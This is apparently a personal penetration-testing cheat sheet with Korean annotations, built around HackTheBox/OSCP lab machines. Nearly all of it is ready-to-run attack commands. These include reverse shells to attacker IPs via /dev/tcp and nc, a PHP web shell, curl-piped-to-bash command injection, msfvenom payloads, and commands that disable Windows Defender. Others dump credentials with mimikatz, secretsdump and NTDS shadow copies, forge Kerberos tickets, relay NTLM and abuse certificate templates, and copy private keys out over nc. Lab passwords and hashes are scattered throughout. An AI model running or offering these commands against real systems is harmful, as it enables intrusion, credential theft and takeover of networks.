### Nmap(AD는 1번만 해도 되는 ping 막아서 -Pn까지만 추가)

### 1,2번 먼저 그 다음 3번

nmap -sCV

nmap -sCV -p- -Pn

nmap -sCVU

### FeroxBuster

```c
feroxbuster -u http://192.168.150.10:9090/ -s 200 -t 200 -x php,txt,html,bak,zip -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

feroxbuster -u <http://10.129.2.213:50000> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

#https
--insecure

feroxbuster -u http://TARGET \ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \ -x php,txt,html,bak,zip -t 50 -o ferox_TARGET.txt
```

### gobuster

```
gobuster dir -u http:// -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 100
- u http://[hostname]: 스캔할 대상 URL을 지정합니다.
- w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt: 스캔에 사용할 단어 목록 파일을 지정합니다.
- t 100: 스레드(Threads) 개수를 100개로 설정합니다.
- q: **조용한 모드(Quiet mode)**를 활성화합니다.
- o gobuster_output.txt: 스캔 결과를 gobuster_output.txt라는 파일에 저장하라는 옵션입니다.

리다이렉트 오류 시
-b 301,404
php txt 태그를 추가하여 페이지 조회
-x php, txt 

```

### dirsearch

```
dirsearch -u <http://dev.siteisup.htb> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e * -x 404

```

### NetCat

```
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/Your_IP>/Your_Port 0>&1'"); ?>

받는 곳
nc -lp 1234 > CEH.kdbx

보내는 곳 (cmd에서만 가능)
nc -w 5 10.10.14.3 1234 < id_rsa

```

### TTY shell

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/sh")'
suid python에 지정되어 있을 때 권한 상승
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'

```

### Searchsploit

```c
-m 파일 복사
-p 파일 위치 확인
searchsploit -m 번호

```

### WebShell

```c
<?php system($_REQUEST['cmd']); ?>

bash -c 'bash -i >%26 /dev/tcp/10.10.14.2/4444 0>%261'

******Windows 연결******
curl <http://10.10.14.2/nc64.exe> -o nc64.exe
nc64.exe -e cmd.exe 10.10.14.3 4444

```

### Find SUID

```c
find / -perm /4000 -type f 2>/dev/null 

find / -name "password" -perm -o=r 2>/dev/null
```

### 어셈블리어 변환

nasm -f bin eternalblue_kshellcode_x64.asm -o evikernel.bin

### MSFVENOM

```c
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.6.6.184 LPORT=9999 -f war > example.war 

msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.6.6.184 LPORT=443 -a x64 --platform Windows -f msi -o rev.msi 

msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.3 LPORT=4444 EXITFUNC=thread -f exe -o dc.exe

msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.10.128 lport=1234 -f exe -o rev.exe
```

### SCP (파일 송수신)

```
칼리에서 서버로 송신
scp cve-2017-16995.c joe@192.168.143.216:

서버에서 파일 수신
scp lnorgaard@10.129.229.41:/home/lnorgaard/passcodes.kdbx .

```

### gpg2john (asc key 파일을 txt 형태로 변환)

gpg2john tryhackme.asc > try.txt

### johntheripper

john --wordlist=/home/kali/Desktop/rockyou.txt try.txt

### gpg (pgp파일 복호화)

gpg --import tryhackme.asc gpg --decrypt credetial.pgp

### Wfuzz (서브 DNS 확인)

```
wfuzz —hc 404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt <https://FUZZ.robyns-petshop.thm>
```

### ffuf

```
ffuf -u <http://searcher.htb> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -H "HOST : FUZZ.searcher.htb" -fw 522

FW : WORDS 개수 숨기기

#Burp Repeater "test" 파일로 저장 후 포트 스캔

ffuf -u <http://editorial.htb/upload-cover> -request test -w <( seq 0 65535) -ac

```

### Crontab

```c
#SH 파일
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.3 4444 >/tmp/f

echo '#!/bin/bash' > asadm
echo 'sh -i >& /dev/tcp/192.168.45.249/3000 0>&1' >> asadm

# Tar gz *
echo "chmod u+s /bin/bash" > test.sh
echo "">"--checkpoint-action=exec=sh test.sh"
echo "">--checkpoint=1
/bin/bash -p

```

### SSH

```c
/srv/ftp 또는 /home/john/.ssh
FTP 접속 후 id_rsa 파일 획득

chmod 600 id_rsa
ssh -i john@192.168.111.x
# 비밀번호 입력 없이 로그인 성공

또는 SSH 크랙

1. ssh-keygen

cat id_rsa.pub 을 cat으로 읽은 후 인증키 파일로 생성

echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDWHCKjvvbzr0HHoAUNdSkSReEa5Xkvw4KH6/JlloWz9T4+Q5okO+eJEAXmC5t76Ok6hhvFjbzP+1q6nH8pTilK+ViedvtKM6zmwUawf+TTespZLENxb+G30PwgsWL/UiuChD0XPNEqDguSJZ9L6T9WkxDV9Qhyb1LyIf5OhfYevIj0dEMDfCwOwagO0Du1fzPHE/4VzEgI4+ppe72Wzc91F8nrTUBt0KNfIY+OLAmXUkld+ZXCflOYT+4ySkrSdzsp5R4SdZf67C1seYiChSaCczXmmI0tuUaItLyua8N0vOEFW6s9A7S+HBluLhj6DWK7vL/WmYOLVlVTtBzqn5ZHCPP5BmDa+rz+vM9g59k2dRauuXPxD3oJaAv2jVLTpWsCmZYmIHaQrNNAGr67ee9RMkq7NokVcF5F+CcFL5+k7nP1QchnXFAHAcpsfVvcx32wk/V0Mz6iwA1zEsWyyFzjwXn8Zaq6e63/ioR5GSmJOC8DsYCz/VcskujB0GpUyoM=' > authorized_keys

2. 칼리 :
id_rsa 가져와서 600권한 주기
ssh -i id_rsa matt@10.10.10.10

==========================NGINX SUDO===========================
<https://github.com/DylanGrl/nginx_sudo_privesc/blob/main/exploit.sh>
exploit.sh 파일을 /home/test 폴더 안에 삽입 
.ssh -> 상위 폴더에 위치해서 실행해야함

ssh키를 칼리로 복제하여 
ssh -i test@10.10.10.10

```

### hydra ***(웹과 관련된 hydra 사용법은 정리 X)

```jsx
hydra -l root -P rockyou.txt -s 22 ssh://192.168.111.149
hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://192.168.186.202
hydra -l user -P sample.txt -s 8080 192.168.112.201 http-post-form '/index.php:user=^USER^&fm_pwd=^PASS^:Login failed.'

```

### wpscan (ap 플러그인, u 유저, t 테마)

```jsx
wpscan --url <http://alvida-eatery.org> --enumerate u
wpscan --url <http://alvida-eatery.org> --usernames admin --passwords ./rockyou.txt --max-threads 50

```

### Eixftool 사용법

Exiftool a.txt

### Cewl 단어 수집 도구

cewl domainaddress -w out.txt -e -d 3

```c
   -w : 수집한 단어 저장될 파일명
   -e : 사이트 내 email 저장
   -d : depth, index기준으로 어디까지 들어갈 것인지
       index > about > team
       2 depth
a
<https://github.com/danielmiessler/SecLists/tree/master>
ㄴsnmp, username

#### username-anarchy 수집된 단어로 아이디 추출

```

### Python

```
python3 -c 'import pty;pty.spawn("/bin/bash")'

python3 -m venv venv
source venv/bin/activate
deactivate

```

### Zip,pfx 크랙

```
zip2john winrm_backup.zip >> sitehash
john sitehash --wordlist=rockyou.txt

pfx2john legacyy_dev_auth.pfx > hash.txt
john hash.txt --wordlist=rockyou.txt

```

### Pfx 파일 pem 키 추가 후 evilwinrm

```c
openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out pub.pem
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out priv.pem -nodes

evil-winrm -i 10.129.227.113 -c pub.pem -k priv.pem -S -r timelapse.htb

```

### github 공격

```
wget -r --no-parent <http://192.168.249.144/.git>
git log --oneline

/.git/logs/HEAD 파일 읽으면 풀 해쉬가 보인다
621a2e79b3a4a08bba12effe6331ff4513bad91a

git show 010dcc30cc1e89344e2bdbd3064f61c772d89a34

.git/config 파일도 확인

git dump
===========초기 셋팅==============
git clone <https://github.com/arthaud/git-dumper>

python3 -m venv venv
source venv/bin/activate
pip install git-dumper
=================================
python3 git_dumper.py <http://siteisup.htb/.git> gitdump

cd gitdump && git status
git restore --staged . && git diff

```

### SNMP

```c
버전 종류 : v1, v2, v3, v1c, v2c, v3c
apt install snmp snmp-mibs-downloader -y
onesixtyone 10.129.230.96 -c common-snmp-community-strings-onesixtyone.txt //어떤 것을 사용하는지 확인 "public"

#속도 짱 빠름
snmpbulkwalk -Cr1000 -c public -v2c 10.129.3.171 > snmp-full-bullk

snmpwalk -c public -v1 10.129.229.17 NET-SNMP-EXTEND-MIB::nsExtendObjects
snmpwalk -v1 -c public [대상 IP] snmp-check 192.168.111.149 -c public

```

### JDWP

```c
<https://github.com/IOActive/jdwp-shellifier>
================================================================
ssh로 포트 포워딩

1. 포트 포워딩 피해 컴퓨터
ssh-keygen

cat id_rsa.pub 을 cat으로 읽은 후 인증키 파일로 생성

echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDWHCKjvvbzr0HHoAUNdSkSReEa5Xkvw4KH6/JlloWz9T4+Q5okO+eJEAXmC5t76Ok6hhvFjbzP+1q6nH8pTilK+ViedvtKM6zmwUawf+TTespZLENxb+G30PwgsWL/UiuChD0XPNEqDguSJZ9L6T9WkxDV9Qhyb1LyIf5OhfYevIj0dEMDfCwOwagO0Du1fzPHE/4VzEgI4+ppe72Wzc91F8nrTUBt0KNfIY+OLAmXUkld+ZXCflOYT+4ySkrSdzsp5R4SdZf67C1seYiChSaCczXmmI0tuUaItLyua8N0vOEFW6s9A7S+HBluLhj6DWK7vL/WmYOLVlVTtBzqn5ZHCPP5BmDa+rz+vM9g59k2dRauuXPxD3oJaAv2jVLTpWsCmZYmIHaQrNNAGr67ee9RMkq7NokVcF5F+CcFL5+k7nP1QchnXFAHAcpsfVvcx32wk/V0Mz6iwA1zEsWyyFzjwXn8Zaq6e63/ioR5GSmJOC8DsYCz/VcskujB0GpUyoM=' > authorized_keys

2. 칼리 :
id_rsa 가져와서 600권한 주기
ssh -i id_rsa -L 8000:127.0.0.1:8000 dev@192.168.141.150

3. 칼리 :
python2 jdwp-shellifier.py -t 127.0.0.1 -p 8000 --cmd "busybox nc -lp 1234 -e /bin/bash"

4. 칼리:
curl 127.0.0.1:5000

5. 칼리
nc 192.168.111.150 1234
================================================================
[1번, 2번을 빠르게 해야한다]

6. 공격 컴퓨터:
mkfifo /tmp/relay
nc -l -p 2345 < /tmp/relay | nc 127.0.0.1 8000 > /tmp/relay &

7. 칼리:
python2 jdwp-shellifier.py -t 192.168.111.150 -p 2345 --cmd "busybox nc -lp 1234 -e /bin/bash"

8. 칼리:
curl 127.0.0.1:5000

9. 칼리
nc 192.168.111.150 1234

```

### sqli

```
', " 삽입 시 500 에러가 나는지 확인

```

### Os Command

```
a`id`;#

;ls
공백 -> ${IFS}

shell.sh 생성
bash -i >& /dev/tcp/10.10.14.34/4444 0>&1
`curl${IFS}<http://10.10.14.2:800/shell.sh|bash`;#>

#실행
bash${IFS}/tmp/shell.sh

```

### PsSQL (postgre)

```
psql -h localhost -p 5432 -U postgres -d cozyhosting -W
\\dt // 접속 테이블 확인
select * from users;
```

### HashCat

```
ASREP : 18200
커버로스 : 13100
NTLMv2 : 5600

hash 유형 확인
hashcat user2.hash

# 앞에 User 명이 있으면 --user 옵션
passcodes:$keepass$

hashcat -m 5600 a.hash Desktop/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

#Sha256 salt 값 있을 때

password:salt <- 형식으로 입력
1410 | sha256($pass.$salt)
1420 | sha256($salt.$pass)
!!!두가지 모두 시도해봐야한다.  

```

### KeePass

```
keepass2john passcodes.kdbx > keepass.hash

vi keepass.hash → Database라고 써져 있는 salt 값 삭제

hashcat -m 13400 keepass.hash Desktop/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force

#Dump 파일이 있는 경우
<https://github.com/z-jxy/keepass_dump>

#접속
kpcli --kdb passcodes.kdbx

cd /특정 부분
show -f 0 이나 1로 확인

```

### Putty key

```
# Notes: 전체 값 넣기
puttygen root-putty.key -O private-openssh -o root.key
ssh -i root.key root@10.129.229.41

```

### LFI

```c
../../../../../etc/passwd
C:/windows/system32/drivers/etc/hosts

#PHP 파일이 처리가 안 될때
<http://10.10.14.2:800/shell.php>

responder -I tun0
//10.10.14.3/share/poc.txt

```

### Path Injection

```c
0. SSH keygen을 통해 SSH 인증 접속
1. /usr/bin/pandora_backup 사용자 파일에 SUID가 있을 시
2. strings pandora_backup 코드 확인
코드 내 tar -xzf /aaa/bbb
-> 이런 식으로 되어 있으면 Path Injection 사용 가능

3. 역쉘 코드 /tmp/tar 파일로 생성
echo -ne '#!/bin/bash\\n\\nbash -i >& /dev/tcp/10.10.14.71/1234 0>&1' > /tmp/tar

4. chmod +x /tmp/tar
5. path 내 /tmp 추가
export PATH=/tmp:$PATH
6. /usr/bin/pandora_backup

```

### apache2

```c
#기본 경로 내 conf 파일 확인
/etc/apache2/sites-enabled/
```

### FTP

```c
파일 다운로드 안 될 때
> bin
실행 후 다시 다운로드
```

### gcc

```c
gcc -o exploit exploit.c
```

### File Upload 취약점

```c
확장자 : .php.png
```

### Cpassword

```
gpp-decrypt -c edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
```

### 7Zip (* exploit)

```c
#파일 읽어오는 취약점
touch test; ln -fs /root/.ssh/id_rsa 0xdf
7za a /backup/`date +%F`.7z -t7z -snl -- *
```

### Directory wordlist

```c
#spring
<https://github.com/danielmiessler/SecLists/tree/master/Discovery/Web-Content/Programming-Language-Specific>
```

### 문자열 출력 cut, awk

```c
#$1 변경
awk '{print $1}' user.txt
awk '{print $1}' user.txt > user2.txt
```

### Tomcat 원격 배포

```c
Tomcat 9
/usr/share/tomcat9/etc/tomcat-users.xml

<https://stackoverflow.com/questions/4432684/tomcat-manager-remote-deploy-script>
curl --upload-file evil.war '<http://tomcat:$3cureP4s5w0rd123!@10.129.253.3:8080/manager/text/deploy?path=/chronos&update=true>'

#배포 War 실행
<http://10.129.253.3:8080/chronos/>
```

## Windows (***Powershell 실행시 무조건 -exec bypass 옵션)

### Windows 방화벽 등

```jsx
원격 데스크톱(RDP) 허용
Set-ItemProperty -Path 'HKLM:\\System\\CurrentControlSet\\Control\\Terminal Server' -name "fDenyTSConnections" -value 0

Windows Defender 실시간 보호 비활성화
Set-MpPreference -DisableRealtimeMonitoring $true

5985 포트 허용 (WinRM 서비스 활성화)
Enable-PSRemoting -Force

netstat -ano | findstr LISTENING

```

### 파일 검색

```
Get-ChildItem -Path C:\\Users\\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue

```

### PowerView

```jsx
비밀번호 변경
1. lisa 계정의 접근 비밀번호

. .\\PowerView.ps1
$SecPassword = ConvertTo-SecureString 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('ADMINISTRATOR.HTB\\emily', $SecPassword)
$NewPassword = ConvertTo-SecureString 'ichliebedich' -AsPlainText -Force
Set-DomainUserPassword -Identity 'ethan' -AccountPassword $NewPassword -Credential $Cred

2. Generic Write 권한 커버로스팅팅

```

### Powershell (Evilwinrm에서 -exec bypass)

```jsx
Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process

```

### PsExec

```jsx
.\\psexec64.exe -s -d -accepteula C:\\temp\\nc64.exe -t -e C:\\Windows\\System32\\cmd.exe 192.168.45.209 4444
Powershell -exec bypass

```

### SAM Dump (SeBackupPrivilege)

```c
reg save HKLM\\SAM sam
reg save HKLM\\SYSTEM system

C:\\programdata\\reg.exe save hklm\\sam sam
C:\\programdata\\reg.exe save hklm\\system system

impacket-secretsdump -sam sam -system system LOCAL

```

### SAM Dump (DC 대상)

```jsx
========칼리 리눅스=========
1. mousepad raj.dsh

set context persistent nowriters
add volume c: alias raj
create
expose %raj% z:

2. unix2dos raj.dsh

========DC 컴퓨터=========
upload raj.dsh
diskshadow /s raj.dsh
robocopy /b z:\\windows\\ntds . ntds.dit
reg save hklm\\system system

download system
download ntds.dit

impacket-secretsdump -ntds ntds.dit -system system LOCAL

```

### BloodHound

```jsx

neo4j stop
pkill -f bloodhound
.\\sharphound.exe -C all
.\\sharphound.exe -c all -d oscp.exam
	ㄴ 권한이 부족하면 수집이 불가능한 경우도 있다

ps1
-> Invoke-BloodHound -CollectionMethod All

***bloodhound-python -c All -u jackie -p 'Password123\\!' -d sub.poseidon.yzx -ns 192.168.213.162 --zip
bloodhound-python -c All -u administrator --hashes :d38e7c66048f80fd9566ab85afca76b1 -d secura.yzx -ns 192.168.149.97 --zip

```

### Msfvenom

msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.204 LPORT=443 EXITFUNC=thread -f exe -o sh.exe

### Find 명령어 (크리덴셜 확인)

```
Get-ChildItem -Path C:\\\\ -Include flag.txt -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path .\\\\ -Include *config* -File -Recurse -ErrorAction SilentlyContinue

Get-ChildItem -Recurse -Include *.txt,*.xml,*.conf,*.vbs | Select-String "password"
```

### **payload경로에 meterpreter가 들어가 있으면 msfconsole만 사용 가능**

windows/x64/meterpreter/reverse_tcp windows/x64/shell_reverse_tcp

hashdump → NTLM이라는 해쉬 값

아이디: 고유식별번호(숫자): NT(디바이스식별값): LM:(비밀번호해시)

### xfreerdp RDP 접속 방법 (원격 홈 열기 : /drive:share,/home/kali )

xfreerdp3 /v:192.168.249.220 /u:steve /p:securityIsNotAnOption++++++ /drive:share,/home/kali

### smbclient ( ”/”안되면 역슬러쉬)

```jsx
#anonymous shares 폴더 확인
smbmap -H 10.10.10.192

#파일 다운로드
smbget smb://10.129.229.17/forensic/memory_analysis/lsass.zip -U audit2020%'#00^BlackKnight'

smbclient -L //10.201.22.105/
smbclient -L //10.201.22.105/ -N

smbclient //10.201.22.105/users -U svc_apache 'S@Ss!K@*t13'

smbclient \\192.168.183.212\\path -U administrator --pw-nt-hash aad3b435b51404eeaad3b435b51404ee

recurse ON
prompt OFF
#폴더 내 모든 파일 다운로드
mget *

# 중요한 파일
\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\MACHINE\\Preferences\\Groups\\groups.xml
```

### Impacket

```jsx
impacket-psexec -hashes 00000000000000000000000000000000:aad3b435b51404eeaad3b435b51404ee Administrator@10.201.22.105

impacket-psexec corp/jen:'Nexus123!'@192.168.210.73

impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.7

//mimicakz랑 똑같음 DCSync
impacket-secretsdump ZEUS.CORP/z.thomas:'^1+>pdRLwyct]j,CYmyi'@192.168.209.158

//as-rep비밀번호 모를 때
impacket-GetNPUsers blackfield.local/ -no-pass -usersfile user.txt -dc-ip 10.129.229.17
impacket-GetNPUsers EGOTISTICAL-BANK.LOCAL/fsmith -no-pass -dc-ip 10.129.95.180

msSQL

└─####impacket-mssqlclient OSCP/celia.almeda@10.10.149.142 -windows-auth -hashes :e728ecbadfb02f51ce8eed753f3ff3fd

└─#### impacket-mssqlclient OSCP/web_svc:Diamond1@10.10.118.142 -windows-auth

```

### Evilwinrm (****), 시험에서 AD Set은 시작과 동시에 접속

```jsx
evil-winrm -i 192.168.149.97 -u Administrator -H d38e7c66048f80fd9566ab85afca76b1
evil-winrm -i 192.168.149.95 -u Eric.Wallows -p 'EricLikesRunning800'

# SSL 접속
evil-winrm -S -i 10.129.227.113 -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV'

# pem key로 접속
evil-winrm -i 10.129.227.113 -c pub.pem -k priv.pem -S -r timelapse.htb

/// 평문 패스워드 일 경우 (단 패스워드에 특문 들어가면 '' 로 묶기)

```

### Mimikatz (Admin 권한일때)

privilege::debug //디버그 권한 상승

token::elevate //토큰 승격

lsadump::sam //LTLM 추출

sekurlsa::logonpasswords // 평문 비밀번호 확인 → 로그인을 한번이라도 하면 기록에 남음

```jsx
.\\mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" "exit"
.\\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

***DC SYNC***
.\\mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:poseidon.yzx /dc:DC01 /all /csv" "exit"

.\\mimikatz.exe "privilege::debug" "slsadump::lsa /patch" "exit"

```

### responder

```jsx
ip a
sudo responder -I tap0

리버스 쉘 이후 서버 내부
dir \\attacker IP\\test

/etc/responder/Responder.conf

```

### lnk relay 공격

```
<https://github.com/Greenwolf/ntlm_theft>

python3 ntlm_theft.py -g all -s 10.10.14.2 -f Services

smbclient로 접속하여 lnk 파일 내 생성된 파일 삽입
==========================================

*****responder-I tun0으로 domain부분 확인하기

1. impacket으로 ntlm 열기
impacket-ntlmrelayx -tf targets.txt -smb2support -socks

*********relay 되기 시작할 때 socks 명령어 쳐서 'adminstatus : true' 확인

2.responder 파일 설정 (smb : off, http : off)
mousepad /etc/responder/Responder.conf
2-1. responder -I tun0

3. proxy 설정
mousepad /etc/proxychains4.conf
socks4 	127.0.0.1 1080

4. admin shell 확인
proxychains4 impacket-smbexec laser/carl.dean@192.168.213.174

```

### NXC (--local-auth → 도메인이 아닌 해당 서버에만 )

```jsx
nxc smb 10.129.231.149 -u guest -p '' --shares

nxc smb 10.129.231.149 -u guest -p '' --rid-brute
# 평문 비밀번호도 보여줌
nxc smb 10.129.228.120 -u -p '' --users

#비밀번호 재사용 공격
nxc smb 10.129.229.17 -u user.txt -p 'S@Ss!K@*t13' --continue-on-success

#계정 비밀번호 같은지 확인
nxc smb support.htb -u user2 -p user2 --continue-on-success --no-brute

nxc smb 192.168.166.250 -u offsec -p 'lab' -M lsassy
nxc ldap 192.168.213.158 -u stephanie -p 'LegmanTeamBenzoin!!' --asreproast out.txt
nxc ldap 192.168.209.158 -u z.thomas -p '' --kerberoasting hashes.kerberoast2 --kdc 192.168.209.158
nxc smb 10.10.118.140 10.10.118.142 -u web_svc -p 'Diamond1' --shares
nxc smb 192.168.249.141 -u administrator -H a1f18f9362b5485cca07aedda6792454 -M powershell_history --local-auth

```

### GUI 환경에서만 runas를 쓸 수 있음

runas /user:backupadmin cmd

### Rubeus (Admin 권한일때

```jsx
.\\Rubeus.exe asreproast /nowrap
.\\Rubeus.exe kerberoast /outfile:hashes.kerberoast

```

### IIS appool, 기계 계정 있을 시

```
.\\rubeus.exe tgtdeleg /nowrap
impacket-ticketConverter ticket.kirbi ticket.ccache
KRB5CCNAME=ticket.ccache impacket-secretsdump -k -no-pass g0.flight.htb -just-dc-user Administrator -target-ip 10.129.42.88

```

### AD DNS 확인

Resolve-DnsName 192.168.149.95

### MySQL Dump 및 명령어

```
.\\mysqldump.exe --all-databases -u root > dump.sql
.\\mysql.exe -u MrGibbonsDB -p"MisterGibbs!Parrot!?1" -e "use gibbon; show tables;"
```

### Domain 가입

net localgroup administrators jeus.corp\z.thomas /add

### PrintSpoofer

```
.\\PrintSpoofer64.exe -c "nc64.exe 10.10.14.3 4444 -e cmd"
.\\PrintSpoofer64.exe -c "C:\\temp\\dc.exe"

```

### 파워쉘 히스토리

```c
파워쉘 히스토리 긁어오기
cd C:\\Users\\Administrator\\appdata\\Roaming\\Microsoft\\Windows\\Powershell\\PSReadLine
nxc smb 192.168.249.141 -u administrator -H a1f18f9362b5485cca07aedda6792454 -M powershell_history --local-auth

```

### Potato

```jsx
.\\SigmaPotato.exe "net user woo woo /add"
.\\SigmaPotato.exe "net localgroup Administrators woo /add"

.\\GodPotato-NET4.exe -cmd "nc64.exe -t -e C:\\Windows\\System32\\cmd.exe 192.168.45.209 1234"

```

### MsSQL

```jsx
SELECT name FROM sys.databases;
SELECT * FROM [변경부분].information_schema.tables;
select * from offsec.dbo.users;

#명령어 실행
xp_cmdshell whoami;

EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

#responder
EXEC xp_dirtree '\\\\10.10.14.2\\share', 1, 1

#파일 읽기 취약점
xp_dirtree C:\\

```

### Powerup

```
. .\\PowerUp.ps1; Invoke-AllChecks
```

### 시간 동기화 ( KRB_AP_ERR_SKEW(Clock skew too great))

```c
apt install ntpsec-ntpdate
systemctl stop systemd-timesyncd
ntpdate htb.loacl

```

### PSafe3

```
hashcat -m 5200 Backup.psafe3 rockyou.txt
pwsafe 실행

```

### Generic Write

```
<https://github.com/ShutdownRepo/targetedKerberoast>
python3 targetedKerberoast.py -v -d 'administrator.htb' -u emily -p UXLCI5iETUsIBoFVTj8yQFKoHjXmb

```

### DC SYNC

```
impacket-secretsdump -just-dc administrator.htb/ethan:'limpbizkit'@10.129.3.216
.\\mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:poseidon.yzx /dc:DC01 /all /csv" "exit"

```

### Certipy-ad (certipy 취약점 검색)

```
certipy-ad find -dc-ip 10.129.253.86 -ns 10.129.253.86 -u raven -p 'R4v3nBe5tD3veloP3r!123' -vulnerable -stdout
```

### Certify

```c
#인증서 식별 CA 목록 확인
0. nxc ldap 10.129.228.253 -u ryan.cooper -p NuclearMosquito3 -M adcs

# 인증서 권한 확인
1. certipy-ad find -u ryan.cooper -p NuclearMosquito3 -target sequel.htb -text -stdout -vulnerable

#클라이언트 인증 권한
Extended Key Usage  : Client Authentication

#인증서를 신청하는 사람
Certificate Name Flag      : EnrolleeSuppliesSubject

#도메인 유저면 모두 신청 가능
Enrollment Rights           : sequel\\Domain Users

#인증서 발급 (-target 호스트 이름 풀네임으로)
2. certipy-ad req -u ryan.cooper -p NuclearMosquito3 -target dc.sequel.htb -upn administrator@sequel.htb -ca sequel-dc-ca -template UserAuthentication

#인증서로 인증 시도
3. certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.228.253

```

### Silver Ticket (2022년 10월 11일 전 업데이트 대상만 사용 가능)

```
=============MS-SQL 계정을 알때=====================
https://www.browserling.com/tools/ntlm-hash>
1. 계정 비밀번호 획득 hash로 변환
2.  Get-ADDomain | fl DomainSID         #SID 획득
3. 시간 동기화 ntpdate -u dc.sequel.htb
4. 티켓 생성
impacket-ticketer -nthash 1443ec19da4dac4ffc953bca1b57b4cf -domain-sid S-1-5-21-4078382237-1492182817-2568127209 -domain sequel.htb -spn nonexistent/DC.SEQUEL.HTB administrator

5. export KRB5CCNAME=administrator.ccache
6. impacket-mssqlclient -k dc.sequel.htb

===================================================

iwr -UseDefaultCredentials <http://web04>
>> 자격 증명 권한 확인

.\\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
>> IIS 서비스의 NTLM 확인

whoami /user
>> SID 획득 (corp.com 도메인을 뜻한다 > 모두 같은 SID 가짐)

도메인 SID(/sid:), 도메인 이름(/domain:), SPN 실행되는 대상(/target:)
SPN 프로토콜(/service:), SPN의 NTLM 해시(/rc4:),공격할 도메인 사용자(/user)
메모리에 위조된 티켓을 삽입할 수 있는 /ptt 옵션

S-1-5-21-1987370270-658905905-1781884369-1105
>> *** SID -> 로그인한 SID 맨 뒤 1105는 제거 해야함
>> *** rc4 -> IIS NTLM 해시

.\\mimikatz.exe "kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin"

klist
>> 명령어로 성공 확인

```

### Runas

```
iwr <http://10.10.14.71/RunasCs.exe> -o r.exe
.\\r.exe C.Bum Tikkycoll_431012284 -r 10.10.14.71:443 cmd
nc -nlvp 443

```

### Port Forwarding (Chisel)

```

***칼리
./chisel_linux server -p 8000 --reverse

***Window
iwr http://10.10.14.71:800/chisel_win.exe> -o win.exe
.\\win.exe client 10.10.14.71:8000 R:8001:127.0.0.1:8000

#ssh 한개의 포트 포워딩
ssh daniel@panda.htb -L 9001:localhost:80
```

### ReadLAPSPassword

```c
Get-ADComputer -filter {ms-mcs-admpwdexpirationtime -like '*'} -prop 'ms-mcs-admpwd','ms-mcs-admpwdexpirationtime'

```

### Server Operators (net user 계정명)

```c
cd C:\\programdata
sc.exe config VSS binpath="C:\\programdata\\nc64.exe -e cmd 10.10.14.3 4444"
sc.exe stop VSS
sc.exe start VSS

nc -nlvp 4444

```

### 윈도우 파일 다운로드

```c
powershell -c "iwr <http://10.10.14.71/nc64.exe> -o nc64.exe"
iwr <http://10.10.14.71/nc64.exe> -o nc64.exe

```

### RPC client (원격 접속 불가능할때 비밀번호 변경)

```c
# 비밀번호 변경
<https://room362.com/posts/2017/reset-ad-user-password-with-linux>

rpcclient -U support 10.129.229.17
setuserinfo2 audit2020 23 "#00^BlackKnight"

#oneline 명령어
rpcclient -U 'blackfield.local/support%#00^BlackKnight' 10.10.10.192 -c 'setuserinfo2 audit2020 23 "0xdf!!!"'

# 계정명 획득
rpcclient -U "" -N 10.10.10.172
querydispinfo

```

### PypyKatz

```c
pypykatz lsa minidump lsass.DMP
```

### Generic All

```jsx
#로컬 그룹 추가
net localgroup administrators oscp\\Eric.Wallows /add

. .\\PowerView.ps1

#도메인 가입
net group "MANAGEMENT DEPARTMENT" stephanie /add /domain

#도메인 가입 확인
net group "MANAGEMENT DEPARTMENT" /domain

#도메인 가입
net user john abc123 /add /domain
net group "Exchange Windows Permissions" john /add
net localgroup "Remote Management Users" john /add

***PowerPs1 도메인 그룹에 추가 방법*** 
$SecPassword = ConvertTo-SecureString 's3rvice' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('htb.local\\svc-alfresco', $SecPassword)
